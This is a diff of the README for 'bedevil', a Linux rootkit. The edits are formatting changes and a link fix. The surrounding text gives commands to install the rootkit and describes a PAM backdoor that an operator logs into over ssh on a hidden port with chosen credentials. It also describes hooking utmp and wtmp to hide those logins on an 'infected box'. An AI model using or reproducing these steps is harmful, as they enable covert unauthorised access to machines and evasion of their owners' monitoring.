@@ -66,9 +66,9 @@ $ ./bedevil.sh -h
  * *Full installation:* `./bedevil.sh -ti` (will ask what you want to enable/disable then launch installation)
  * *Mimic installation:* `LDSO_PRELOAD=/tmp/fakepreload ./bedevil.sh -i` (mimic rootkit installation/setup without preloading the rootkit)
  * **Compressing include directory & using resulting tarball**:
- *   * Compressing: `BD_UNAME=myuname BD_PWD=mypassword ... ./bedevil.sh -vzd`
- *   * Using tarball: `TARBALL=./pathto.tar.gz ./bedevil.sh ...`
- *   * i.e.: `TARBALL=./pathto.tar.gz ./bedevil.sh -i/-c`
+     * Compressing: `BD_UNAME=myuname BD_PWD=mypassword ... ./bedevil.sh -vzd`
+     * Using tarball: `TARBALL=./pathto.tar.gz ./bedevil.sh ...`
+     * i.e.: `TARBALL=./pathto.tar.gz ./bedevil.sh -i/-c`
 
 </hr>
 
@@ -142,7 +142,7 @@ Within bedevil, you can choose to use the PAM backdoor and/or the accept hook ba
  * During setup, you'll be given a username and password which can be used to log into the backdoor, over ssh.
    * To reiterate, by default the username and password are randomly generated, but you can specify a username and password of your own by setting them before running `bedevil.sh`.
      * i.e.: `BD_UNAME=myusername BD_PWD=mypassword ./bedevil.sh ...`
- * See [etc/ssh.sh](https://github.com/naworkcaj/bdvl/blob/master/inc/ssh.sh) on connecting to the infected box's PAM backdoor with your hidden port.
+ * See [etc/ssh.sh](https://github.com/naworkcaj/bdvl/blob/master/etc/ssh.sh) on connecting to the infected box's PAM backdoor with your hidden port.
  * *By hooking the responsible [utmp & wtmp functions](https://github.com/naworkcaj/bdvl/tree/master/inc/utmp), information that may give off indication of a PAM backdoor is throttled.*
  * *On boxes that use `systemd` (which is most), when a user (real-or-not) is logged in, a process called `(sd-pam)` will be visible.*
 
